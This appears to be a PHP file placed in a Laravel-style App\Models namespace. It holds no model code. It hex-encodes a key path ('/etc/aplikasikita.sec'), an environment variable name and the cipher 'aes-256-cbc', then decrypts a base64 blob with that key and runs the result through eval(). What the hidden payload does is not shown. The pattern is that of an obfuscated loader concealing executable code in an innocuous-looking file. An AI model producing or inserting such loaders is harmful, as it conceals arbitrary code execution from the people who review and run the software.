<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('9D0jxapxnbetG15PPwaIEA==');

$c=base64_decode(

'5GzYuw900IBED0Tv8MibkN1rUm9RdPFqwfQHDppLz62rxVVgsIuFZMUwc7Nu3AmJufoocOQddFZ6' .
'OewgTKTpblT2snj8yQ5CulStGPkNfv/XEEb0uJEXyLlXfsaEKTfAFN88KnD2uQQx7F0Z3eHPIzQF' .
'Brhstfh3RlSvYSWPbIE9CwAnxhv4dVY0/j+WuhwFf1nZ/134hWriaxO4Dg0vHXz7Sd+GjAK1+Pyf' .
'3uijFmeMA+noyo0us+YL0eTZanI6IZceoZbB0rUkYR5sCQm3ImvULsI82teiRODG0/bSu67cCaMm' .
'7i7dQuIxhzh7yMKZjbe06CfvXhbJ6I0QxklX0iU9k8TUatKj83icK/PXDPHhKtfGqQlUR1XXpHjr' .
'qUOiGIP28+6T4hHqMFxp8nPIsKcyEjDuRyynmkOmGhS/swYiNOM5C3P3WdWB4RuAESgPS62FJjFz' .
'R0H+qRoyqo81HkzGNZFEfwPtyvPy5It0daUt5nsk8YVtYiXkrg6gt7P7ke3vH95Hiuu8VtLhIN0u' .
'lzWkT9caKly7hEXJ46XkVIDN6dGzx4AmhoEmXMVy3gvs+v75lK9xoIw12WC2gZbfVUu6VadRhsSd' .
'baKNkSaMKGqd8gYVAMCP9OsgZ6lnmIRApfxSc7zogUikgu4Ub69ylPTZALp7bicGEpOlW0JfQjeQ' .
'DlK7ceEk7KWJTl8T2nJaMsTcINtzzEDQBaTG7+dZ2Z/hkERxTuJCalViES/t3w73r7YpZmcAdM3n' .
'YOsmoq4gWmEeTDD7QrEJbMk67ZTIAXo5SY9QZpUTY3VWH39iX3X5F/+KA2J+FWjuf+qnwUKvuohR' .
'sv3m2X+pvWXvAVYz2Pw62dhq8VtKk8IkW4+fGLeieTFDSsgvh62trb0BCZ+S+kYEQFbTpTdAz02G' .
'wUQ9MQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

